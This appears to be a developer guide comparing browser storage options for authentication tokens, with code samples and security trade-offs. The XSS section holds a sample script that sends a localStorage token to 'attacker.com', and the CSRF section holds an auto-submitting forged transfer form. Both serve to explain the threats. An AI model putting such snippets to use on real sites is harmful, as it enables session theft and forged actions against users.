# Browser Storage for Authentication

Browser storage refers to the different mechanisms available in web browsers to store data on the client side. Understanding these options is crucial for implementing secure authentication workflows.

## Types of Browser Storage

### 1. Cookies

Small pieces of data (max 4KB) stored by the browser and automatically sent with every HTTP request to the same domain.

```javascript
// Server sets cookie
res.cookie('sessionId', 'abc123', {
  httpOnly: true,
  secure: true,
  maxAge: 24 * 60 * 60 * 1000
});

// Browser automatically sends cookie with requests
// No JavaScript needed
```

**Properties:**
- Size: 4KB per cookie
- Expiration: Can be set (session or persistent)
- Accessibility: Can be httpOnly (no JavaScript access)
- Sent automatically: Yes, with every request
- Domain-specific: Yes

### 2. localStorage

Persistent storage that remains until explicitly cleared. Data survives browser restarts.

```javascript
// Store token
localStorage.setItem('authToken', 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...');

// Retrieve token
const token = localStorage.getItem('authToken');

// Send with requests manually
fetch('/api/profile', {
  headers: {
    'Authorization': `Bearer ${token}`
  }
});

// Remove token
localStorage.removeItem('authToken');

// Clear all
localStorage.clear();
```

**Properties:**
- Size: 5-10MB (varies by browser)
- Expiration: Never (until manually cleared)
- Accessibility: JavaScript only
- Sent automatically: No, must be added manually
- Domain-specific: Yes (same origin only)

### 3. sessionStorage

Similar to localStorage but data is cleared when the browser tab/window is closed.

```javascript
// Store token (cleared on tab close)
sessionStorage.setItem('authToken', 'token123');

// Retrieve token
const token = sessionStorage.getItem('authToken');

// Remove token
sessionStorage.removeItem('authToken');
```

**Properties:**
- Size: 5-10MB (varies by browser)
- Expiration: When tab/window closes
- Accessibility: JavaScript only
- Sent automatically: No, must be added manually
- Domain-specific: Yes (same origin only)
- Tab-specific: Yes (not shared between tabs)

### 4. IndexedDB

Low-level API for storing large amounts of structured data, including files and blobs.

```javascript
// Complex API - typically not used for simple auth tokens
const request = indexedDB.open('AuthDB', 1);

request.onsuccess = (event) => {
  const db = event.target.result;
  // Store/retrieve data
};
```

**Properties:**
- Size: Large (hundreds of MB to GB)
- Expiration: Never (until manually cleared)
- Accessibility: JavaScript only (async API)
- Sent automatically: No
- Domain-specific: Yes

### 5. Memory (JavaScript Variables)

Data stored in JavaScript variables, lost on page refresh.

```javascript
// Store in memory
let authToken = 'token123';

// Lost on page refresh/navigation
```

**Properties:**
- Size: Limited by available RAM
- Expiration: On page refresh/navigation
- Accessibility: JavaScript only
- Sent automatically: No
- Most secure: Yes (can't be accessed by XSS after page load)

## Comparison Table

| Feature | Cookies | localStorage | sessionStorage | IndexedDB | Memory |
|---------|---------|--------------|----------------|-----------|--------|
| **Size** | 4KB | 5-10MB | 5-10MB | 100MB+ | RAM |
| **Persistence** | Configurable | Permanent | Tab session | Permanent | Page load |
| **Auto-sent** | Yes | No | No | No | No |
| **httpOnly** | Yes | No | No | No | N/A |
| **XSS vulnerable** | No (if httpOnly) | Yes | Yes | Yes | Minimal |
| **CSRF vulnerable** | Yes | No | No | No | No |
| **Shared tabs** | Yes | Yes | No | Yes | No |
| **Server access** | Yes | No | No | No | No |

## Authentication Use Cases

### Session-Based Authentication (Cookies)

**Best for:** Traditional web apps, server-rendered pages

```javascript
// Server-side
app.post('/login', (req, res) => {
  // Verify credentials
  req.session.userId = user.id;
  res.json({ message: 'Logged in' });
});

// Cookie automatically sent with all requests
app.get('/profile', (req, res) => {
  if (!req.session.userId) {
    return res.status(401).send('Unauthorized');
  }
  res.json({ user: req.user });
});
```

**Pros:**
- ✅ Most secure (httpOnly prevents XSS)
- ✅ Automatic - no client-side code needed
- ✅ Server controls session lifecycle
- ✅ Can't be accessed by JavaScript

**Cons:**
- ❌ Vulnerable to CSRF (needs protection)
- ❌ Limited to 4KB
- ❌ Sent with every request (bandwidth)
- ❌ Requires server-side session storage

### Token-Based Authentication (localStorage)

**Best for:** SPAs, mobile apps, APIs

```javascript
// Client-side
async function login(username, password) {
  const response = await fetch('/api/login', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ username, password })
  });
  
  const { token } = await response.json();
  localStorage.setItem('authToken', token);
}

async function fetchProfile() {
  const token = localStorage.getItem('authToken');
  
  const response = await fetch('/api/profile', {
    headers: { 'Authorization': `Bearer ${token}` }
  });
  
  return response.json();
}

function logout() {
  localStorage.removeItem('authToken');
}
```

**Pros:**
- ✅ Larger storage (5-10MB)
- ✅ Stateless (no server session)
- ✅ Works across domains
- ✅ Not vulnerable to CSRF
- ✅ Good for SPAs and mobile

**Cons:**
- ❌ Vulnerable to XSS attacks
- ❌ Accessible by any JavaScript
- ❌ Must manually attach to requests
- ❌ Persists until manually cleared

### Short-Lived Tokens (sessionStorage)

**Best for:** Temporary authentication, single-tab workflows

```javascript
// Store token only for current tab session
sessionStorage.setItem('authToken', token);

// Automatically cleared when tab closes
```

**Pros:**
- ✅ Cleared on tab close (better security)
- ✅ Not shared between tabs
- ✅ Not vulnerable to CSRF
- ✅ Good for sensitive operations

**Cons:**
- ❌ Vulnerable to XSS
- ❌ Lost on tab close (poor UX)
- ❌ Not shared between tabs
- ❌ Must manually attach to requests

### In-Memory Storage (Most Secure)

**Best for:** Highly sensitive applications

```javascript
// Store token in closure/module
let authToken = null;

export function setToken(token) {
  authToken = token;
}

export function getToken() {
  return authToken;
}

export function clearToken() {
  authToken = null;
}

// Use in requests
fetch('/api/profile', {
  headers: { 'Authorization': `Bearer ${getToken()}` }
});
```

**Pros:**
- ✅ Most secure (lost on refresh)
- ✅ Not accessible via XSS after page load
- ✅ No persistence = no theft risk
- ✅ Not vulnerable to CSRF

**Cons:**
- ❌ Lost on page refresh (poor UX)
- ❌ Requires re-authentication often
- ❌ Complex to implement

## Security Comparison

### XSS (Cross-Site Scripting) Vulnerability

```javascript
// Malicious script injected into page
<script>
  // Can steal from localStorage
  const token = localStorage.getItem('authToken');
  fetch('https://attacker.com/steal?token=' + token);
  
  // Can steal from sessionStorage
  const token2 = sessionStorage.getItem('authToken');
  
  // CANNOT steal httpOnly cookies
  document.cookie; // Won't include httpOnly cookies
</script>
```

**Protection:**
- Cookies: Use `httpOnly: true`
- localStorage/sessionStorage: Sanitize all user input, use CSP
- Memory: Minimal risk (lost on refresh)

### CSRF (Cross-Site Request Forgery) Vulnerability

```javascript
// Attacker's site
<form action="https://yoursite.com/transfer" method="POST">
  <input name="amount" value="1000">
  <input name="to" value="attacker">
</form>
<script>document.forms[0].submit();</script>

// Cookies are automatically sent - vulnerable!
// localStorage/sessionStorage NOT sent - safe!
```

**Protection:**
- Cookies: Use CSRF tokens, SameSite attribute
- localStorage/sessionStorage: Not vulnerable (not auto-sent)

## Recommended Approaches

### 1. Session-Based (Most Secure)

```javascript
// Use httpOnly cookies with session
app.use(session({
  secret: 'secret',
  cookie: {
    httpOnly: true,    // Prevents XSS
    secure: true,      // HTTPS only
    sameSite: 'strict' // Prevents CSRF
  }
}));
```

**Use when:**
- Building traditional web apps
- Security is top priority
- Server-side rendering
- Same-domain authentication

### 2. Token in httpOnly Cookie (Hybrid)

```javascript
// Store JWT in httpOnly cookie
app.post('/login', (req, res) => {
  const token = jwt.sign({ userId: user.id }, SECRET);
  
  res.cookie('token', token, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict'
  });
  
  res.json({ message: 'Logged in' });
});

// Server reads from cookie
app.get('/profile', (req, res) => {
  const token = req.cookies.token;
  const decoded = jwt.verify(token, SECRET);
  res.json({ userId: decoded.userId });
});
```

**Use when:**
- Want stateless JWT benefits
- Need XSS protection
- Building SPAs with same domain

### 3. Token in localStorage (Less Secure)

```javascript
// Only if XSS protection is strong
localStorage.setItem('token', token);
```

**Use when:**
- Building SPAs/mobile apps
- Need cross-domain authentication
- Have strong XSS protections (CSP, sanitization)
- Convenience over maximum security

### 4. Refresh Token Pattern (Best of Both)

```javascript
// Short-lived access token in memory
let accessToken = null;

// Long-lived refresh token in httpOnly cookie
app.post('/login', (req, res) => {
  const accessToken = jwt.sign({ userId: user.id }, SECRET, { expiresIn: '15m' });
  const refreshToken = jwt.sign({ userId: user.id }, REFRESH_SECRET, { expiresIn: '7d' });
  
  res.cookie('refreshToken', refreshToken, {
    httpOnly: true,
    secure: true,
    sameSite: 'strict'
  });
  
  res.json({ accessToken });
});

// Client stores access token in memory
// Refresh when expired using httpOnly cookie
```

**Use when:**
- Need both security and UX
- Building modern SPAs
- Can implement token refresh logic

## Best Practices

1. **For maximum security:** httpOnly cookies with session-based auth
2. **For SPAs:** Refresh token pattern (access in memory, refresh in httpOnly cookie)
3. **Never store sensitive data in:** localStorage or sessionStorage if avoidable
4. **Always use HTTPS:** Especially with cookies (secure flag)
5. **Implement CSP:** Content Security Policy to prevent XSS
6. **Use short expiration:** For tokens stored in localStorage
7. **Sanitize all input:** Prevent XSS attacks
8. **Add CSRF protection:** When using cookies

## Quick Decision Guide

**Choose Cookies if:**
- Traditional web app
- Security is critical
- Same-domain only
- Server-side rendering

**Choose localStorage if:**
- Building SPA/mobile app
- Need cross-domain
- Have strong XSS protections
- Stateless architecture

**Choose sessionStorage if:**
- Temporary authentication
- Single-tab workflow
- Extra security (cleared on close)

**Choose Memory if:**
- Maximum security needed
- Can handle frequent re-auth
- Short-lived sessions acceptable

**Choose Refresh Token Pattern if:**
- Want best of both worlds
- Building modern SPA
- Can implement complexity
